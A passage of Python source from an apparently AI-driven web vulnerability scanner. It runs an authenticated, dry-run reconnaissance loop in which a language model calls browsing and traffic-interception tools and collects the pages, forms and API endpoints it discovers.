        page = auth_session.page

        cookies = await page.context.cookies()
        cookie_dict = {c["name"]: c["value"] for c in cookies}
        headers = auth_session.get_auth_header()
        http_client = httpx.AsyncClient(
            headers=headers,
            cookies=cookie_dict,
            timeout=30.0,
        )

        registry = EndpointRegistry()
        if target.scan_mode in ("api", "both"):
            postman_path = _resolve_import_path(config_dir, target.postman_file)
            if postman_path:
                registry.add(parse_postman_collection(postman_path, _resolve_import_path(config_dir, target.postman_env)))
            openapi_path = _resolve_import_path(config_dir, target.openapi_file)
            if openapi_path:
                registry.add(parse_openapi_spec(openapi_path))
            burp_path = _resolve_import_path(config_dir, getattr(target, "burp_file", None))
            if burp_path:
                try:
                    import json as _json
                    burp_data = _json.loads(Path(burp_path).read_text(encoding="utf-8"))
                    registry.add_from_traffic(burp_data)
                except Exception:
                    pass

        tools = DryRunScanTools(
            page=page,
            http_client=http_client,
            registry=registry,
            auth_session=auth_session,
        )

        app_info = await detect_app_type(page)
        phases = get_phases(
            target.scan_mode,
            app_info,
            scan_scope=getattr(target, "scan_scope", "directory"),
            focus_areas=getattr(target, "focus_areas", None),
            scan_profile=getattr(target, "scan_profile", "vulnerability_scan"),
        )
        recon_phases = [ph for ph in phases if "recon" in ph.id.lower()]
        if not recon_phases:
            recon_phases = phases[:1]

        system_prompt = build_system_prompt(target, registry, app_info)
        messages: list[dict] = [{"role": "system", "content": system_prompt}]

        pages_discovered: list[str] = []
        forms_discovered: list[dict] = []
        apis_discovered: list[dict] = []

        for phase in recon_phases:
            messages.append({"role": "user", "content": phase.prompt})

            for step in range(min(phase.max_steps, 20)):
                _sanitize_all_messages(messages)
                response = router.complete(
                    model=model,
                    messages=messages,
                    tools=TOOL_DEFINITIONS,
                )
                if not response or not getattr(response, "choices", None):
                    logger.warning("Empty response from %s at phase %s step %d", model, phase.id, step)
                    break
                msg = response.choices[0].message
                msg_dict = msg.model_dump() if hasattr(msg, "model_dump") else dict(msg)
                msg_dict = _sanitize_message(msg_dict)
                messages.append(msg_dict)

                tool_calls = msg_dict.get("tool_calls") or []
                if tool_calls:
                    for tc in tool_calls:
                        fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", {})
                        fn_name = fn.get("name") if isinstance(fn, dict) else getattr(fn, "name", "")
                        fn_name = _sanitize_tool_name(fn_name)
                        fn_args = fn.get("arguments") if isinstance(fn, dict) else getattr(fn, "arguments", "{}")
                        result = await tools.execute(fn_name, fn_args)
                        tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                        messages.append({
                            "role": "tool",
                            "tool_call_id": tc_id,
                            "content": json.dumps(result),
                        })
                        if fn_name == "navigate" and "url" in result:
                            pages_discovered.append(result.get("url", ""))
                        elif fn_name == "get_forms" and "forms" in result:
                            forms_discovered.extend(result.get("forms", []))
                        elif fn_name in ("get_network_log", "intercept_requests"):
                            registry.add_from_traffic(result)
                else:
                    break

        eps = registry.get_all()
        for ep in eps:
            apis_discovered.append({"method": ep.method, "path": ep.path, "url": ep.url})

        auth_session.stop_monitor()
        await http_client.aclose()
        await browser.close()

    return {
        "pages_discovered": list(dict.fromkeys(pages_discovered)),
        "forms_discovered": forms_discovered,
        "apis_discovered": apis_discovered,
    }
